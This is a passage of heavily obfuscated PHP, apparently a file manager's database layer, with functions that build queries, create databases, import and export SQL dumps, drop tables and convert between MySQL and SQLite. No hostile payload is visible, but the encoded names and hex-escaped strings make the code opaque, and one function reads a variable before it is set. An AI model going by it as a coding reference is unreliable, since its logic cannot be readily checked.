$this->parseWhere(!empty($·çØÙ…û[$›ıõğä—[275]]) ? $·çØÙ…û[$›ıõğä—[275]] : $›ıõğä—[12]) . $this->parseOrder(!empty($·çØÙ…û[$›ıõğä—[365]]) ? $·çØÙ…û[$›ıõğä—[365]] : $›ıõğä—[12]) . $this->parseLimit(!empty($·çØÙ…û[$›ıõğä—[292]]) ? $·çØÙ…û[$›ıõğä—[292]] : $›ıõğä—[12]) . $this->parseLock(isset($·çØÙ…û[$›ıõğä—[853]]) ? $·çØÙ…û[$›ıõğä—[853]] : !1) . $this->parseComment(!empty($·çØÙ…û[$›ıõğä—[354]]) ? $·çØÙ…û[$›ıõğä—[354]] : $›ıõğä—[12]); return $this->execute($³ä¬ïö, $this->parseBind(!empty($·çØÙ…û[$›ıõğä—[285]]) ? $·çØÙ…û[$›ıõğä—[285]] : array())); } public function delete($ÍØ„·†Ò = array()) { $ÑúµÅ—Ÿ =& $_SERVER[ïëó©ÒÚ]; $this->model = $ÍØ„·†Ò[$ÑúµÅ—Ÿ[281]]; $¶Ìî÷£ = $ÑúµÅ—Ÿ[1045] . $this->parseTable($ÍØ„·†Ò[$ÑúµÅ—Ÿ[279]]) . $this->parseWhere(!empty($ÍØ„·†Ò[$ÑúµÅ—Ÿ[275]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[275]] : $ÑúµÅ—Ÿ[12]) . $this->parseOrder(!empty($ÍØ„·†Ò[$ÑúµÅ—Ÿ[365]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[365]] : $ÑúµÅ—Ÿ[12]) . $this->parseLimit(!empty($ÍØ„·†Ò[$ÑúµÅ—Ÿ[292]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[292]] : $ÑúµÅ—Ÿ[12]) . $this->parseLock(isset($ÍØ„·†Ò[$ÑúµÅ—Ÿ[853]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[853]] : !1) . $this->parseComment(!empty($ÍØ„·†Ò[$ÑúµÅ—Ÿ[354]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[354]] : $ÑúµÅ—Ÿ[12]); return $this->execute($¶Ìî÷£, $this->parseBind(!empty($ÍØ„·†Ò[$ÑúµÅ—Ÿ[285]]) ? $ÍØ„·†Ò[$ÑúµÅ—Ÿ[285]] : array())); } public function select($«Û¹ç—ò = array()) { $•µğæ =& $_SERVER[ïëó©ÒÚ]; $this->model = $«Û¹ç—ò[$•µğæ[281]]; $£òîğõ† = $this->buildSelectSql($«Û¹ç—ò); $¿¿éÂ³ = isset($«Û¹ç—ò[$•µğæ[349]]) ? $«Û¹ç—ò[$•µğæ[349]] : !1; if ($¿¿éÂ³) { $åŸÚÓ·­ = is_string($¿¿éÂ³[$•µğæ[94]]) ? $¿¿éÂ³[$•µğæ[94]] : $•µğæ[1046] . md5($£òîğõ†); $ïü×‚Ş = think_cache($åŸÚÓ·­, $•µğæ[12], $¿¿éÂ³); if (!1 !== $ïü×‚Ş) { return $ïü×‚Ş; } } $±š»º¶õ = $this->query($£òîğõ†, $this->parseBind(!empty($«Û¹ç—ò[$•µğæ[285]]) ? $«Û¹ç—ò[$•µğæ[285]] : array())); if ($¿¿éÂ³ && !1 !== $±š»º¶õ) { think_cache($åŸÚÓ·­, $±š»º¶õ, $¿¿éÂ³); } return $±š»º¶õ; } public function buildSelectSql($áé„½½œ = array()) { $º‰§Á¢Ô =& $_SERVER[ïëó©ÒÚ]; if (isset($áé„½½œ[$º‰§Á¢Ô[353]])) { if (strpos($áé„½½œ[$º‰§Á¢Ô[353]], $º‰§Á¢Ô[50])) { list($ü‘Û¤ö–, $Ñ†°ËÚÎ) = explode($º‰§Á¢Ô[50], $áé„½½œ[$º‰§Á¢Ô[353]]); } else { $ü‘Û¤ö– = $áé„½½œ[$º‰§Á¢Ô[353]]; } $ü‘Û¤ö– = $ü‘Û¤ö– ? $ü‘Û¤ö– : 1; $Ñ†°ËÚÎ = isset($Ñ†°ËÚÎ) ? $Ñ†°ËÚÎ : (is_numeric($áé„½½œ[$º‰§Á¢Ô[292]]) ? $áé„½½œ[$º‰§Á¢Ô[292]] : 20); $†„´ƒêø = $Ñ†°ËÚÎ * ((int) $ü‘Û¤ö– - 1); $áé„½½œ[$º‰§Á¢Ô[292]] = $†„´ƒêø . $º‰§Á¢Ô[50] . $Ñ†°ËÚÎ; } if (think_config($º‰§Á¢Ô[1047])) { $Ö‘Ìç»ü = $º‰§Á¢Ô[1048] . md5(serialize($áé„½½œ)); $³ ç¦›Ú = think_cache($Ö‘Ìç»ü); if ($³ ç¦›Ú) { return $³ ç¦›Ú; } } $  ßÕä¶ = $this->parseSql($this->selectSql, $áé„½½œ); $  ßÕä¶ .= $this->parseLock(isset($áé„½½œ[$º‰§Á¢Ô[853]]) ? $áé„½½œ[$º‰§Á¢Ô[853]] : !1); if (isset($Ö‘Ìç»ü)) { think_cache($Ö‘Ìç»ü, $  ßÕä¶); } return $  ßÕä¶; } public function parseSql($ÊŒ§Úˆ³, $³«Ñ…ŠŠ = array()) { $Ü›¯Ë¥¿ =& $_SERVER[ïëó©ÒÚ]; $ÊŒ§Úˆ³ = str_replace(array($Ü›¯Ë¥¿[1049], $Ü›¯Ë¥¿[1050], $Ü›¯Ë¥¿[1051], $Ü›¯Ë¥¿[1052], $Ü›¯Ë¥¿[1053], $Ü›¯Ë¥¿[1054], $Ü›¯Ë¥¿[1055], $Ü›¯Ë¥¿[1056], $Ü›¯Ë¥¿[1057], $Ü›¯Ë¥¿[1058], $Ü›¯Ë¥¿[1059]), array($this->parseTable("{$³«Ñ…ŠŠ[$Ü›¯Ë¥¿[279]]}"), $this->parseDistinct(isset($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[1060]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[1060]] : !1), $this->parseField(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[273]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[273]] : $Ü›¯Ë¥¿[188]), $this->parseJoin(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[282]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[282]] : $Ü›¯Ë¥¿[12]), $this->parseWhere(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[275]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[275]] : $Ü›¯Ë¥¿[12]), $this->parseGroup(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[524]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[524]] : $Ü›¯Ë¥¿[12]), $this->parseHaving(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[1061]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[1061]] : $Ü›¯Ë¥¿[12]), $this->parseOrder(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[365]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[365]] : $Ü›¯Ë¥¿[12]), $this->parseLimit(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[292]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[292]] : $Ü›¯Ë¥¿[12]), $this->parseUnion(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[347]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[347]] : $Ü›¯Ë¥¿[12]), $this->parseComment(!empty($³«Ñ…ŠŠ[$Ü›¯Ë¥¿[354]]) ? $³«Ñ…ŠŠ[$Ü›¯Ë¥¿[354]] : $Ü›¯Ë¥¿[12])), $ÊŒ§Úˆ³); return $ÊŒ§Úˆ³; } public function getLastSql($Ûñ¥úÛ¸ = '') { return $Ûñ¥úÛ¸ ? $this->modelSql[$Ûñ¥úÛ¸] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ì•†öİ) { return addslashes($Ì•†öİ); } public function setModel($Ìøúˆ”œ) { $this->model = $Ìøúˆ”œ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ñ¨ÅĞ¾ö = array()) { $¶÷À‹‚® =& $_SERVER[ïëó©ÒÚ]; if (empty($ñ¨ÅĞ¾ö)) { $ñ¨ÅĞ¾ö = $GLOBALS[$¶÷À‹‚®[6]][$¶÷À‹‚®[21]]; } $this->database = $ñ¨ÅĞ¾ö; } public function model($ÁßÎÏêì = '') { return new ModelBase($ÁßÎÏêì, $_SERVER[ïëó©ÒÚ][12], $this->database); } public function db($Ê‘ÛÜÅÂ = false) { $«¢ß… =& $_SERVER[ïëó©ÒÚ]; $úÕğ’Å = array_change_key_case($this->database); if ($this->dbType() == $«¢ß…[13] || !$Ê‘ÛÜÅÂ) { return $this->model()->db(); } $î“ñû‘õ = $úÕğ’Å[$«¢ß…[975]]; $úÕğ’Å[$«¢ß…[975]] = $«¢ß…[12]; if ($úÕğ’Å[$«¢ß…[970]] == $«¢ß…[967]) { $½ø«³ë› = $úÕğ’Å[$«¢ß…[976]]; $úÕğ’Å[$«¢ß…[976]] = substr($½ø«³ë›, 0, strrpos($½ø«³ë›, $«¢ß…[1062])); } $this->database = $úÕğ’Å; $€£”ÓıÚ = $this->model()->db(); try { $Î£‹‹â = $€£”ÓıÚ->execute("\x73\150\157\x77\x20\144\x61\164\141\x62\x61\x73\145\163\40\154\x69\153\145\40\47{$î“ñû‘õ}\x27"); } catch (Exception $ğÖ“ãöĞ) { } if (!$Î£‹‹â) { $€£”ÓıÚ->execute("\x63\162\x65\141\164\145\40\x64\141\x74\x61\142\x61\163\145\40\x60{$î“ñû‘õ}\140"); } $úÕğ’Å[$«¢ß…[975]] = $î“ñû‘õ; if ($úÕğ’Å[$«¢ß…[970]] == $«¢ß…[967]) { $úÕğ’Å[$«¢ß…[976]] .= $«¢ß…[1062] . $î“ñû‘õ; } $this->database = $úÕğ’Å; $€£”ÓıÚ->execute("\x75\163\145\40\x60{$î“ñû‘õ}\x60"); return $€£”ÓıÚ; } public function createTable($˜ù´—Ÿ , &$ıßÉ…¤¦) { $ÕúĞ‚Äş =& $_SERVER[ïëó©ÒÚ]; if (!IO::exist($˜ù´—Ÿ )) { ActionCall($ÕúĞ‚Äş[1063], !0, 0); show_json(LNG($ÕúĞ‚Äş[1064]), !1); } $Ô­¯²† = $this->model()->db(); $òâ¤øÜü = sqlSplit(IO::getContent($˜ù´—Ÿ )); foreach ($òâ¤øÜü as $ó¢Éº’) { $£Ï½Áñ™ = stripos($ó¢Éº’, $ÕúĞ‚Äş[1065]) === 0; if ($£Ï½Áñ™) { $ıßÉ…¤¦->task[$ÕúĞ‚Äş[796]] += 1; } $Ô­¯²†->execute($ó¢Éº’); if ($£Ï½Áñ™) { preg_match($ÕúĞ‚Äş[1066], $ó¢Éº’, $ƒäÈ¤Ôƒ); $ıßÉ…¤¦->task[$ÕúĞ‚Äş[1067]] = $ƒäÈ¤Ôƒ[1]; $ıßÉ…¤¦->update(1); } } } public function insertTable($¯›…ˆÀì, &$™èÄÅ…) { $ıèú”´ã =& $_SERVER[ïëó©ÒÚ]; $À²µ¡‹ë = $this->model()->db(); $ÄğßòŞ  = $Ğâ‚È« ? array($Ğâ‚È«) : $À²µ¡‹ë->getTables(); foreach ($¯›…ˆÀì as $é“ ÎŞŞ) { $Ğâ‚È« = basename($é“ ÎŞŞ, $ıèú”´ã[798]); if (!in_array($Ğâ‚È«, $ÄğßòŞ )) { continue; } $™èÄÅ…->task[$ıèú”´ã[1067]] = $Ğâ‚È«; if (get_filesize($é“ ÎŞŞ) == 0) { continue; } $óâ½¶Ş— = $this->sqlToDb($é“ ÎŞŞ, $™èÄÅ…); if (!$óâ½¶Ş—) { ActionCall($ıèú”´ã[1063], !0, 0); show_json(LNG($ıèú”´ã[1068]) . "\x5b{$Ğâ‚È«}\x5d", !1); } } } public function sqlFromDb($÷³¸¿, $¶¢¥¹, &$è¹Ú©ş, $‰¸¡¡íµ = '') { if ($è¹Ú©ş) { $è¹Ú©ş->task[$_SERVER[ïëó©ÒÚ][1067]] = $÷³¸¿; } $á±‚šÚû = $this->model($÷³¸¿); $ìù‡Ûï¾ = 0; $“Ñ»Şš = 0; $Õ£€Ù = 10000; $Àœ¸èß² = fopen($¶¢¥¹, $_SERVER[ïëó©ÒÚ][1069]); $¾Ğ©£®ó = $á±‚šÚû->getPk(); $ÓÑ†Ÿ´Ü = $á±‚šÚû->getDbFields(); $°İšÕÃè = $_SERVER[ïëó©ÒÚ][12]; if ($GLOBALS[$_SERVER[ïëó©ÒÚ][797]] && in_array($÷³¸¿, array($_SERVER[ïëó©ÒÚ][1070], $_SERVER[ïëó©ÒÚ][1071]))) { $°İšÕÃè = $÷³¸¿; } do { $Ğ±½ç¾æ = array($¾Ğ©£®ó => array($_SERVER[ïëó©ÒÚ][1017], $“Ñ»Şš)); $ÖÒ¡ìß¾ = $á±‚šÚû->where($Ğ±½ç¾æ)->field($ÓÑ†Ÿ´Ü)->order($¾Ğ©£®ó . $_SERVER[ïëó©ÒÚ][1072])->limit($Õ£€Ù)->select(); $ÖÒ¡ìß¾ = !empty($ÖÒ¡ìß¾) ? $ÖÒ¡ìß¾ : array(); if (!($¥¢§§Üµ = count($ÖÒ¡ìß¾))) { break; } $õß†È‰ç = end($ÖÒ¡ìß¾); $“Ñ»Şš = $õß†È‰ç[$¾Ğ©£®ó]; $ë×€¯» = array(); foreach ($ÖÒ¡ìß¾ as $Ì¢ó¿ãê) { if ($°İšÕÃè) { if ($÷³¸¿ == $_SERVER[ïëó©ÒÚ][1070]) { if ($Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][33]] == $_SERVER[ïëó©ÒÚ][1073]) { $Ü·É™ƒ§ = json_decode($Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][374]], !0); if ($Ü·É™ƒ§[$_SERVER[ïëó©ÒÚ][32]] == $GLOBALS[$_SERVER[ïëó©ÒÚ][797]] && $Ü·É™ƒ§[$_SERVER[ïëó©ÒÚ][760]] != 1) { continue; } } } else { if ($Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][33]] == $_SERVER[ïëó©ÒÚ][1074] && $Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][94]] == $_SERVER[ïëó©ÒÚ][789]) { continue; } } } if ($‰¸¡¡íµ) { $Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][84]] = "\173\151\157\x3a{$‰¸¡¡íµ}\175" . substr($Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][84]], strlen("\x7b\151\157\x3a{$Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][827]]}\x7d")); $Ì¢ó¿ãê[$_SERVER[ïëó©ÒÚ][827]] = $‰¸¡¡íµ; } $ë×€¯»[] = $_SERVER[ïëó©ÒÚ][1075] . $this->sqlEncode($Ì¢ó¿ãê) . $_SERVER[ïëó©ÒÚ][1076]; } $§Ğƒ¦ª— = "\x49\116\123\x45\122\124\40\x49\116\124\x4f\40\x60{$÷³¸¿}\x60\x20\x28\x60" . implode($_SERVER[ïëó©ÒÚ][1077], $ÓÑ†Ÿ´Ü) . $_SERVER[ïëó©ÒÚ][1078]; fwrite($Àœ¸èß², $§Ğƒ¦ª— . implode($_SERVER[ïëó©ÒÚ][1079], $ë×€¯») . $_SERVER[ïëó©ÒÚ][71] . PHP_EOL); $ìù‡Ûï¾ += $¥¢§§Üµ; if ($è¹Ú©ş) { $è¹Ú©ş->update($¥¢§§Üµ); } } while ($Õ£€Ù == $¥¢§§Üµ); fclose($Àœ¸èß²); return $ìù‡Ûï¾; } public function sqlToDb($‡ÑÆ´±, &$Àœªîë¤) { $¢ãñÌ¥ê =& $_SERVER[ïëó©ÒÚ]; $ŸáÆïÃ¾ = $this->model()->db(); $¿¼ˆèéî = @fopen($‡ÑÆ´±, $¢ãñÌ¥ê[1080]); if (!$¿¼ˆèéî) { return !1; } $¢¬Û¯»µ = 0; $¤úıºí¶ = $¢ãñÌ¥ê[12]; $£›±ôÖ = array(); $àöûŠûÑ = $this->dbType(); $¹’ŒÂé¡ = $àöûŠûÑ == $¢ãñÌ¥ê[13] ? 500 : 2000; $’¶ÔÁ¦Ï = basename($‡ÑÆ´±, $¢ãñÌ¥ê[798]); $ò÷ò‰üÓ = 0; $ÙÆ÷áôã = 4194304 - 104858; $­Ø¾ÖĞÏ = 1000000 - 104858; while (!feof($¿¼ˆèéî)) { $•³§ŠŠ± = trim(fgets($¿¼ˆèéî)); if (!$•³§ŠŠ±) { continue; } $†óîß· = $this->sqlDecode($•³§ŠŠ±, $àöûŠûÑ, $’¶ÔÁ¦Ï); if (stripos($†óîß·, $¢ãñÌ¥ê[355]) === 0) { if (!$¤úıºí¶) { $¤úıºí¶ = $†óîß· . $¢ãñÌ¥ê[53]; } continue; } if ($Àœªîë¤) { $Àœªîë¤->task[$¢ãñÌ¥ê[796]] += 1; } $¢¬Û¯»µ++; $£›±ôÖ[] = rtrim(rtrim(trim($†óîß·), $¢ãñÌ¥ê[50]), $¢ãñÌ¥ê[71]); $ƒ£ÖÊÀ‡ = null; $Ãâã‘½‰ = strlen($†óîß·); $ò÷ò‰üÓ += $Ãâã‘½‰; if ($ò÷ò‰üÓ >= ($¹’ŒÂé¡ == 500 ? $­Ø¾ÖĞÏ : $ÙÆ÷áôã)) { $ƒ£ÖÊÀ‡ = array_pop($£›±ôÖ); if ($¢¬Û¯»µ > 1) { $¢¬Û¯»µ--; } } if ($¢¬Û¯»µ >= $¹’ŒÂé¡ || $ƒ£ÖÊÀ‡) { $†óîß· = $¤úıºí¶ . implode($¢ãñÌ¥ê[50], $£›±ôÖ); if (!$ŸáÆïÃ¾->execute($†óîß·)) { return !1; } if ($Àœªîë¤) { $Àœªîë¤->update($¢¬Û¯»µ); } $£›±ôÖ = array(); $¢¬Û¯»µ = 0; $ò÷ò‰üÓ = 0; if ($ƒ£ÖÊÀ‡) { $£›±ôÖ = array($ƒ£ÖÊÀ‡); $¢¬Û¯»µ = 1; $ò÷ò‰üÓ = $Ãâã‘½‰; } } } fclose($¿¼ˆèéî); if (!empty($£›±ôÖ)) { $†óîß· = $¤úıºí¶ . implode($¢ãñÌ¥ê[50], $£›±ôÖ); if (!$ŸáÆïÃ¾->execute($†óîß·)) { return !1; } if ($Àœªîë¤) { $Àœªîë¤->update($¢¬Û¯»µ); } } return !0; } public function dropTable($íÉÈÜ£¨ = null) { $Éâ¢êöó = $this->model()->db(); $Ÿœˆ¬¬ = $íÉÈÜ£¨ ? array($íÉÈÜ£¨) : $Éâ¢êöó->getTables(); if (!$Ÿœˆ¬¬) { return; } foreach ($Ÿœˆ¬¬ as $íÉÈÜ£¨) { if ($íÉÈÜ£¨) { $íÉÈÜ£¨ = strtolower($íÉÈÜ£¨); } else { continue; } $Éâ¢êöó->execute("\144\x72\157\x70\x20\164\x61\x62\154\145\x20\151\146\x20\145\170\x69\x73\164\x73\x20\140{$íÉÈÜ£¨}\140"); } } private function sqlEncode($ô”³…À¨) { $Œ‘»¶€ë =& $_SERVER[ïëó©ÒÚ]; $¢…Ê¸½á = array(); foreach ($ô”³…À¨ as $Í§óÃñ®) { if (is_array($Í§óÃñ®)) { $Í§óÃñ® = json_encode_force($Í§óÃñ®); } $Í§óÃñ® = addslashes($Í§óÃñ®); $Í§óÃñ® = str_replace(array($Œ‘»¶€ë[1081], $Œ‘»¶€ë[231]), array($Œ‘»¶€ë[1082], $Œ‘»¶€ë[1083]), $Í§óÃñ®); $¢…Ê¸½á[] = str_replace($Œ‘»¶€ë[58], $Œ‘»¶€ë[1084], $Í§óÃñ®); } return $Œ‘»¶€ë[58] . implode($Œ‘»¶€ë[1085], $¢…Ê¸½á) . $Œ‘»¶€ë[58]; } private function sqlDecode($Ô¤·ûîë, $‘ÕŞúÌ, $Ÿíœ°Ÿ = '') { $Ş­Çü³Û =& $_SERVER[ïëó©ÒÚ]; $Ô¤·ûîë = str_replace(array($Ş­Çü³Û[1082], $Ş­Çü³Û[1083]), array($Ş­Çü³Û[1081], $Ş­Çü³Û[231]), $Ô¤·ûîë); if ($‘ÕŞúÌ == $Ş­Çü³Û[13]) { return $Ÿíœ°Ÿ != $Ş­Çü³Û[1086] ? stripslashes($Ô¤·ûîë) : $Ô¤·ûîë; } if ($Ÿíœ°Ÿ == $Ş­Çü³Û[1086]) { $Ô¤·ûîë = str_replace($Ş­Çü³Û[1087], $Ş­Çü³Û[118], stripslashes($Ô¤·ûîë)); } return $Ô¤·ûîë; } public function getSqlFile($‡ªƒİ·š = '') { $Üıå™­æ =& $_SERVER[ïëó©ÒÚ]; $™ö¢ü§¤ = $this->dbType(!0); $ü¨÷¤‹ = CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\154\x2f\144\x61\x74\141\x2f{$™ö¢ü§¤}\x2e\x73\161\x6c"; $Ö°¨æ› = file_get_contents($ü¨÷¤‹); $Ñòû¯‘ = $Üıå™­æ[1088] . ($™ö¢ü§¤ == $Üıå™­æ[814] ? $Üıå™­æ[1089] : $Üıå™­æ[1090]) . $Üıå™­æ[1091]; preg_match_all($Ñòû¯‘, $Ö°¨æ›, $Áêì§Ì); $‡¤ÙÁ¢ = $Áêì§Ì[1]; $ñ §òèò = $this->model()->db(); $Îéè“Œë = $ñ §òèò->getTables(); $ó‹ÇÅ‹À = TEMP_FILES . $Üıå™­æ[1092] . date($Üıå™­æ[761]) . $Üıå™­æ[8]; del_dir($ó‹ÇÅ‹À); mk_dir($ó‹ÇÅ‹À); $€ í­¡ = $ó‹ÇÅ‹À . $Üıå™­æ[1093]; $’©Õ»•Ï = $ó‹ÇÅ‹À . $Üıå™­æ[1094]; $Ê§áã = $™ö¢ü§¤ == $Üıå™­æ[13] ? $Üıå™­æ[814] : $Üıå™­æ[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\x6c\x6c\x2f\144\x61\x74\141\57{$Ê§áã}\56\x73\161\154", $ó‹ÇÅ‹À); @touch($ó‹ÇÅ‹À . $™ö¢ü§¤ . $Üıå™­æ[798]); $€¡‚ÌÔ¥ = fopen($€ í­¡, $Üıå™­æ[1069]); $ÚĞùÁøˆ = fopen($’©Õ»•Ï, $Üıå™­æ[1069]); if ($™ö¢ü§¤ == $Üıå™­æ[13]) { $Îéè“Œë = array_diff($Îéè“Œë, array($Üıå™­æ[794], $Üıå™­æ[795])); $Ôö¨˜üì = array($Üıå™­æ[1095], $Üıå™­æ[1096], $Üıå™­æ[1097]); fwrite($ÚĞùÁøˆ, implode(PHP_EOL, $Ôö¨˜üì) . PHP_EOL . PHP_EOL); foreach ($Îéè“Œë as $éôóïŸ³) { $‰‰ ò¬Ú = $this->sqlFromSqlite($éôóïŸ³); if (!$‰‰ ò¬Ú[$Üıå™­æ[13]]) { continue; } fwrite($ÚĞùÁøˆ, $‰‰ ò¬Ú[$Üıå™­æ[13]] . PHP_EOL . PHP_EOL); if (!in_array($éôóïŸ³, $‡¤ÙÁ¢)) { fwrite($€¡‚ÌÔ¥, $‰‰ ò¬Ú[$Üıå™­æ[814]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Îéè“Œë as $éôóïŸ³) { $‰‰ ò¬Ú = $this->sqlFromMysql($éôóïŸ³); if (!$‰‰ ò¬Ú[$Üıå™­æ[814]]) { continue; } fwrite($€¡‚ÌÔ¥, $‰‰ ò¬Ú[$Üıå™­æ[814]] . PHP_EOL . PHP_EOL); if (!in_array($éôóïŸ³, $‡¤ÙÁ¢)) { fwrite($ÚĞùÁøˆ, $‰‰ ò¬Ú[$Üıå™­æ[13]] . PHP_EOL . PHP_EOL); } } } fclose($€¡‚ÌÔ¥); fclose($ÚĞùÁøˆ); $Ö°¨æ› = array($Üıå™­æ[814] => $€ í­¡, $Üıå™­æ[13] => $’©Õ»•Ï); return $‡ªƒİ·š ? $Ö°¨æ›[$‡ªƒİ·š] : $Ö°¨æ›; } public function dbType($‹¹»øÈ = false) { $Ü™óŸ =& $_SERVER[ïëó©ÒÚ]; $úØÕ„ê÷ = $‹¹»øÈ ? $GLOBALS[$Ü™óŸ[6]][$Ü™óŸ[21]] : $this->database; $úØÕ„ê÷ = array_change_key_case($úØÕ„ê÷); $ûí±‡Æ« = $úØÕ„ê÷[$Ü™óŸ[970]]; if ($ûí±‡Æ« == $Ü™óŸ[967]) { $ä¼òØø = explode($Ü™óŸ[4], $úØÕ„ê÷[$Ü™óŸ[976]]); $ûí±‡Æ« = $ä¼òØø[0]; } $í†ÑŠ¤ = array($Ü™óŸ[1098] => $Ü™óŸ[13], $Ü™óŸ[915] => $Ü™óŸ[814]); if (isset($í†ÑŠ¤[$ûí±‡Æ«])) { $ûí±‡Æ« = $í†ÑŠ¤[$ûí±‡Æ«]; } return $ûí±‡Æ«; } public function sqlFromMysql($š‡’ÍÎ, $†ŞØ…óå = '') { $Ÿú¿ûĞö =& $_SERVER[ïëó©ÒÚ]; $‚Ÿœî˜Ï = $this->model()->db(); $ÕöÀ˜¼ = $‚Ÿœî˜Ï->query($Ÿú¿ûĞö[1099] . $š‡’ÍÎ . $Ÿú¿ûĞö[385]); if (!$ÕöÀ˜¼ || !$ÕöÀ˜¼[0]) { return !1; } $ê¨“œÀ¡ = _get($ÕöÀ˜¼[0], $Ÿú¿ûĞö[1100], $Ÿú¿ûĞö[12]); if (!$ê¨“œÀ¡) { return !1; } $½²˜Ÿ¡¬ = "\104\x52\x4f\120\40\x54\101\102\114\105\40\x49\106\40\105\x58\x49\x53\x54\x53\x20\140{$š‡’ÍÎ}\x60\x3b" . PHP_EOL . $ê¨“œÀ¡ . $Ÿú¿ûĞö[71]; if ($†ŞØ…óå && $†ŞØ…óå == $Ÿú¿ûĞö[814]) { return $½²˜Ÿ¡¬; } $û·ªÂ‘— = array_change_key_case($GLOBALS[$Ÿú¿ûĞö[6]][$Ÿú¿ûĞö[21]]); $ªü³ôË³ = $û·ªÂ‘—[$Ÿú¿ûĞö[975]]; $½—İ‘ì = $Ÿú¿ûĞö[1101] . $ªü³ôË³ . $Ÿú¿ûĞö[1102] . $š‡’ÍÎ . $Ÿú¿ûĞö[58]; $üúµáÎ = $Ÿú¿ûĞö[1103] . $š‡’ÍÎ . $Ÿú¿ûĞö[903]; $„¦¨÷ = $‚Ÿœî˜Ï->query($½—İ‘ì); if (empty($„¦¨÷)) { $«ªÇÏ»™ = array($Ÿú¿ûĞö[814] => $Ÿú¿ûĞö[12], $Ÿú¿ûĞö[13] => $Ÿú¿ûĞö[12]); return $†ŞØ…óå ? $«ªÇÏ»™[$†ŞØ…óå] : $«ªÇÏ»™; } $ôïŠ£‘î = $‚Ÿœî˜Ï->query($üúµáÎ); $Ê Ş¼ßå = $Ÿú¿ûĞö[12]; $ª‰ÅëÛñ = array(); foreach ($ôïŠ£‘î as $ÌúóµĞ—) { if (!$Ê Ş¼ßå && $ÌúóµĞ—[$Ÿú¿ûĞö[1104]] == $Ÿú¿ûĞö[1105]) { $Ê Ş¼ßå = $ÌúóµĞ—[$Ÿú¿ûĞö[1106]]; } if (isset($ª‰ÅëÛñ[$ÌúóµĞ—[$Ÿú¿ûĞö[1104]]])) { $ª‰ÅëÛñ[$ÌúóµĞ—[$Ÿú¿ûĞö[1104]]][$Ÿú¿ûĞö[1107]][] = $ÌúóµĞ—[$Ÿú¿ûĞö[1106]]; continue; } $ª‰ÅëÛñ[$ÌúóµĞ—[$Ÿú¿ûĞö[1104]]] = array($Ÿú¿ûĞö[1108] => $ÌúóµĞ—[$Ÿú¿ûĞö[1104]], $Ÿú¿ûĞö[1107] => array($ÌúóµĞ—[$Ÿú¿ûĞö[1106]]), $Ÿú¿ûĞö[1109] => $ÌúóµĞ—[$Ÿú¿ûĞö[1110]] == $Ÿú¿ûĞö[88] ? 0 : 1); } $ÏŞø¼Ï² = array(); foreach ($ª‰ÅëÛñ as $ÌúóµĞ—) { $º‹¼ˆÓ£ = $ÌúóµĞ—[$Ÿú¿ûĞö[1108]] == $Ÿú¿ûĞö[1105]; $¸øÈËû = array($Ÿú¿ûĞö[1111], $ÌúóµĞ—[$Ÿú¿ûĞö[1109]] == $Ÿú¿ûĞö[88] && !$º‹¼ˆÓ£ ? $Ÿú¿ûĞö[1112] : $Ÿú¿ûĞö[12], $Ÿú¿ûĞö[1113], $Ÿú¿ûĞö[1114] . $š‡’ÍÎ . $Ÿú¿ûĞö[11] . ($º‹¼ˆÓ£ ? $Ÿú¿ûĞö[1115] : $ÌúóµĞ—[$Ÿú¿ûĞö[1108]]) . $Ÿú¿ûĞö[118], $Ÿú¿ûĞö[1116], $Ÿú¿ûĞö[118] . $š‡’ÍÎ . $Ÿú¿ûĞö[118], $Ÿú¿ûĞö[1117] . implode($Ÿú¿ûĞö[1118], $ÌúóµĞ—[$Ÿú¿ûĞö[1107]]) . $Ÿú¿ûĞö[1119]); $ÏŞø¼Ï²[] = implode($Ÿú¿ûĞö[53], $¸øÈËû) . $Ÿú¿ûĞö[71]; } $»ÀÒ±øÎ = array(); $§şßèªö = array($Ÿú¿ûĞö[1120] => $Ÿú¿ûĞö[1121], $Ÿú¿ûĞö[1121] => $Ÿú¿ûĞö[1121], $Ÿú¿ûĞö[288] => $Ÿú¿ûĞö[315], $Ÿú¿ûĞö[287] => $Ÿú¿ûĞö[315]); foreach ($„¦¨÷ as $ÌúóµĞ—) { $¸øÈËû = array($Ÿú¿ûĞö[118] . $ÌúóµĞ—[$Ÿú¿ûĞö[1122]] . $Ÿú¿ûĞö[118], isset($§şßèªö[$ÌúóµĞ—[$Ÿú¿ûĞö[1123]]]) ? $§şßèªö[$ÌúóµĞ—[$Ÿú¿ûĞö[1123]]] : 